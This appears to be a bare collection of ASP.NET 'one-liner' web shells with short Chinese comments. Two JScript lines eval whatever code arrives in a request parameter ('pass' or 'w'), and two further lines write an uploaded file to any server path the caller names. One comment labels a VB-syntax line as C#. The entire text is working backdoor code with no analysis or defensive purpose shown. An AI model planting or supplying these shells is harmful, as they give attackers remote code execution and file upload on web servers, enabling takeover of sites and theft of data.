<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>

<%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>

//Jscript的asp.net一句话
<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request["f"])  ); }%>

//C#的asp.net一句话
<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request("f")) ) %>